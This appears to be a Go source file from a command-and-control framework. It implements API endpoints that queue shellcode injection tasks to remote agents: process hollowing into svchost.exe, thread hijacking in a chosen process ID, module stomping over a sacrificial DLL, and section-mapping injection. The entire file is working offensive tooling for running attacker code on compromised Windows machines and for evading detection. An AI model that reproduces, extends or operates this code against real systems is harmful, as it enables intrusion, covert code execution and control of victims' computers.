package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// Hollow queues process hollowing on the agent.
// POST /api/v1/agent/:id/inject/hollow
// Body: { "exe": "C:\\Windows\\System32\\svchost.exe", "shellcode_b64": "..." }
func (h *Handlers) Hollow(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		Exe           string `json:"exe"`
		ShellcodeFile string `json:"shellcode_file"`
		ShellcodeB64  string `json:"shellcode_b64"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	b64, err := resolveShellcode(req.ShellcodeFile, req.ShellcodeB64)
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, err.Error())
		return
	}
	if req.Exe == "" {
		req.Exe = `C:\Windows\System32\svchost.exe`
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "hollow",
		ProcessPath:   req.Exe,
		ShellcodeB64:  b64,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "HOLLOW",
		fmt.Sprintf("exe=%s size=%d bytes", req.Exe, base64DecodedLen(b64)), true)

	h.APIResponse(c, true, "Process hollowing queued", map[string]interface{}{
		"command_id": cmd.ID,
		"exe":        req.Exe,
	}, "")
}

// Hijack queues thread hijacking in a target PID.
// POST /api/v1/agent/:id/inject/hijack
// Body: { "pid": 1234, "shellcode_b64": "..." }
func (h *Handlers) Hijack(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		PID           uint32 `json:"pid" binding:"required"`
		ShellcodeFile string `json:"shellcode_file"`
		ShellcodeB64  string `json:"shellcode_b64"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	b64, err := resolveShellcode(req.ShellcodeFile, req.ShellcodeB64)
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, err.Error())
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "hijack",
		InjectPID:     req.PID,
		ShellcodeB64:  b64,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "HIJACK",
		fmt.Sprintf("PID=%d size=%d bytes", req.PID, base64DecodedLen(b64)), true)

	h.APIResponse(c, true, "Thread hijack queued", map[string]interface{}{
		"command_id": cmd.ID,
		"pid":        req.PID,
	}, "")
}

// Stomp queues module stomping (.text overwrite) on the agent.
// POST /api/v1/agent/:id/inject/stomp
// Body: { "dll": "xpsservices.dll", "shellcode_b64": "..." }
func (h *Handlers) Stomp(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		DLL           string `json:"dll"`
		ShellcodeFile string `json:"shellcode_file"`
		ShellcodeB64  string `json:"shellcode_b64"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	b64, err := resolveShellcode(req.ShellcodeFile, req.ShellcodeB64)
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, err.Error())
		return
	}
	if req.DLL == "" {
		req.DLL = "xpsservices.dll"
	}

	cmd := &types.Command{
		ID:             uuid.New().String(),
		AgentID:        agentID,
		OperationType:  "stomp",
		SacrificialDLL: req.DLL,
		ShellcodeB64:   b64,
		CreatedAt:      time.Now(),
		Status:         "pending",
		Timeout:        30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "STOMP",
		fmt.Sprintf("dll=%s size=%d bytes", req.DLL, base64DecodedLen(b64)), true)

	h.APIResponse(c, true, "Module stomp queued", map[string]interface{}{
		"command_id": cmd.ID,
		"dll":        req.DLL,
	}, "")
}

// MapInject queues cross-process section mapping injection.
// POST /api/v1/agent/:id/inject/map
// Body: { "pid": 0, "shellcode_b64": "..." }  (pid=0 = local process)
func (h *Handlers) MapInject(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		PID           uint32 `json:"pid"`
		ShellcodeFile string `json:"shellcode_file"`
		ShellcodeB64  string `json:"shellcode_b64"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	b64, err := resolveShellcode(req.ShellcodeFile, req.ShellcodeB64)
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, err.Error())
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "mapinject",
		InjectPID:     req.PID,
		ShellcodeB64:  b64,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	target := "local"
	if req.PID > 0 {
		target = fmt.Sprintf("PID=%d", req.PID)
	}
	h.server.Logger.LogCommandExecution(agentID, "MAPINJECT",
		fmt.Sprintf("target=%s size=%d bytes", target, base64DecodedLen(b64)), true)

	h.APIResponse(c, true, "Section mapping injection queued", map[string]interface{}{
		"command_id": cmd.ID,
		"pid":        req.PID,
	}, "")
}
